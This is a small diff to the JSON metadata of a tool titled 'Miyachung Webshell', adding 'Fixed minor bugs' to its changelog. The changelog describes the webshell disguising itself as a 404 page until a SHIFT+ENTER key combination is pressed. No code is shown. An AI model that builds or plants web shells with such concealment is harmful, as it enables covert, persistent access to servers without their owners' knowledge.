@@ -2,5 +2,5 @@
   "title":"Miyachung Webshell",
   "version":"1.2",
   "is_active":true,
-  "changelog":"- Miyachung webshell will show a 404 not found page until SHIFT+ENTER key combination used"
+  "changelog":"- Miyachung webshell will show a 404 not found page until SHIFT+ENTER key combination used<br/>- Fixed minor bugs"
 }
